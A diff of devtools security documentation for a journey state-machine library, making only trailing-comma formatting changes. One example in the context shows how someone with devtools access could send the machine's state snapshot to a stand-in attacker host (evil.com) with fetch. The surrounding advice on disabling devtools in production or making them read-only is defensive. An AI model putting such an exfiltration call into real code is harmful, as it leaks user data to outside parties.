@@ -63,7 +63,7 @@ machine.resetJourney();
 // Or just steal data directly
 fetch("https://evil.com/steal", {
   method: "POST",
-  body: JSON.stringify(machine.getSnapshot())
+  body: JSON.stringify(machine.getSnapshot()),
 });
 ```
 
@@ -106,7 +106,7 @@ If someone has physical access to a machine with devtools open, they can send co
 ```typescript
 // Disable entirely in production
 attachJourneyDevtools(machine, {
-  enabled: process.env.NODE_ENV !== "production"
+  enabled: process.env.NODE_ENV !== "production",
 });
 ```
 
@@ -116,7 +116,7 @@ attachJourneyDevtools(machine, {
 // Enable with commands
 attachJourneyDevtools(machine, {
   enabled: true,
-  commandsEnabled: true
+  commandsEnabled: true,
 });
 ```
 
@@ -126,7 +126,7 @@ attachJourneyDevtools(machine, {
 // Enable read-only mode
 attachJourneyDevtools(machine, {
   enabled: true,
-  commandsEnabled: false // Can view state, but not send commands
+  commandsEnabled: false, // Can view state, but not send commands
 });
 ```
 
